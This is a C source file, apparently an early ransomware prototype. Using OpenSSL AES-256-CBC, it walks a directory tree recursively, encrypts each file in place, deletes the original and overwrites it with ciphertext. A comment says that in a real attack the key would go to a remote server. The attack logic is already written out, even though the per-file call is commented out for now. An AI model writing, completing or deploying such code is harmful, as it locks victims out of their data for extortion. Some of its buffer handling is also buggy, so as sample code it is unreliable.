#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h> // use openssl evp for encryption
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define BLOCK_SIZE 16 // AES uses 128-bit block size encryption

void encrypt(unsigned char *key, char *fileName) {
    // AES Encryption parameters
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new(); // New ctx cipher
    
    unsigned char *iv = malloc(16); // IV is always 16 bytes
    // Generate the IV
    RAND_bytes(iv, 16);

    // Initiate cipher and store key/iv in it
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);

    // Buffer paramters
    unsigned char buffer[1024];
    unsigned char buffer_out[1024 + BLOCK_SIZE];

    // File information 
    FILE *temp_output, *curr_file;
    char fileTemp[] = "temp_file.txt";

    // Read the binaries of the current file
    curr_file = fopen(fileName, "rb");
    temp_output = fopen(fileTemp, "wb");

    // Read in the current file into blocks
    int bytes_read, out_len;
    while(1) {
        bytes_read = fread(buffer, sizeof(unsigned char), 1024, curr_file);
        EVP_CipherUpdate(ctx, buffer_out, &out_len, buffer, bytes_read);
        fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
        if (bytes_read < 1024) {
            break;
        }
    }

    // Cipher the block 
    EVP_CipherFinal_ex(ctx, buffer_out, &out_len);
    fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
    EVP_CIPHER_CTX_cleanup(ctx);
    fclose(temp_output);
    
    // Append the IV to the file for decryption later
    temp_output = fopen(fileTemp, "a");
    fwrite(iv, sizeof(unsigned char), 16, temp_output);
    fclose(temp_output);

    // Close the file when encryption is complete
    fclose(curr_file);
    remove(fileName); // Delete the current file
    rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
}

// This could go inside the main encrypt function with some if statements
// but it will probably get larger in the future, so it will be its own function
void decrypt(unsigned char *key, char *fileName) {
    // AES Encryption parameters
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new(); // ctx cipher
    FILE *curr_file, *temp_output; // Current and temp files
    unsigned char *iv = malloc(17); // IV
    
    // Read in the IV from the last 16 bytes of the file
    int read_byte; 
    curr_file = fopen(fileName, "rb");
    fseek(curr_file, -16L, SEEK_END);  
    read_byte = fread(iv, 1, 17, curr_file); // Read 16 bytes
    int size = ftell(curr_file) - 16;
    iv[read_byte] = '\0';
    rewind(curr_file);
    truncate(fileName, size); // Truncate the file to remove the IV

    // Initiate cipher and store key/iv in it
    EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);

    // Buffer paramters
    unsigned char buffer[1024];
    unsigned char buffer_out[1024 + BLOCK_SIZE];

    // Read the binaries of the current file
    char fileTemp[] = "temp_file.txt";
    temp_output = fopen(fileTemp, "wb");

    // Read in the current file into blocks
    int bytes_read, out_len;
    while(1) {
        bytes_read = fread(buffer, sizeof(unsigned char), 1024, curr_file);
        EVP_DecryptUpdate(ctx, buffer_out, &out_len, buffer, bytes_read);
        fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
        if (bytes_read < 1024) {
            break;
        }
    }

    // Cipher the last block 
    EVP_DecryptFinal_ex(ctx, buffer_out, &out_len);
    fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
    EVP_CIPHER_CTX_cleanup(ctx);
    fclose(temp_output);

     // Close the file when decryption is complete
    fclose(curr_file);
    remove(fileName); // Delete the current file
    rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
}

int isDir(const char* fileName) {
    struct stat path;
    stat(fileName, &path);
    return S_ISREG(path.st_mode);
}

void recursiveSearch(unsigned char *key, char *dirName) {
    DIR *curr = opendir(dirName);
    struct dirent *entry;

    if (!(curr = opendir(dirName)))
        return;

    while((entry=readdir(curr))) {
        char pathLocation[1024];
        if (entry->d_type == DT_DIR) {
            // Ignore . and .. files (linux testing)
            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
                continue;
            }
            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
            printf("%s\n", pathLocation);
            recursiveSearch(key, pathLocation);
        } else {            
            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
            printf("%s\n", pathLocation);
            //decrypt(key, pathLocation);
        }
    }
}

int main (int argc, char *argv[]) {
    // Our cipher parameters
    int num_bytes = 32; // 256-bit key size
    unsigned char *key = malloc(num_bytes);
    FILE *f_key;

    // Generate the key
    RAND_bytes(key, 32);

    // Write the key to a file -- in an actual attack, this would be sent to a super secret server
    // I might add the functionality for this key to be sent to a server later on
    if (argc <= 1) {
        f_key = fopen("key.txt", "wb");
        fwrite(key, 1, 32, f_key);
        fclose(f_key);
    } else {
        f_key = fopen("key.txt", "rb");   
        fread(key, 32 + 1, 1, f_key);
        fclose(f_key);
    }
    
    char directory[] = "files";
    recursiveSearch(key, directory);

    // We don't like our keys being stored in the memory
    free(key);
    return 0;
}